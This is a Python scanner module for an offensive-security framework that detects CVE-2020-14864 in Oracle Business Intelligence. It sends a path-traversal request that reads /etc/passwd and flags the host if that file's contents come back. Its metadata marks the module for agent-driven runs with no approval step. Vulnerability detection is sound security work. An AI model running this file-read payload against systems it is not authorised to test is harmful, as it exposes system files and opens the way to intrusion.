#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle Business Intelligence Enterprise Edition 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle Fusion - Directory Traversal/Local File Inclusion Detection',
        'description': 'Oracle Business Intelligence Enterprise Edition 5.5.0.0.0, 12.2.1.3.0, and 12.2.1.4.0 are vulnerable to local file inclusion vulnerabilities via "getPreviewImage."',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'oracle', 'lfi', 'kev', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/159748/Oracle-Business-Intelligence-Enterprise-Edition-5.5.0.0.0-12.2.1.3.0-12.2.1.4.0-LFI.html',
            'https://www.oracle.com/security-alerts/cpuoct2020.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-14864',
        ],
        'cve': 'CVE-2020-14864',
    }

    def run(self):
        for path in ('/analytics/saw.dll?bieehome&startPage=1', '/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Oracle Fusion - Directory Traversal/Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

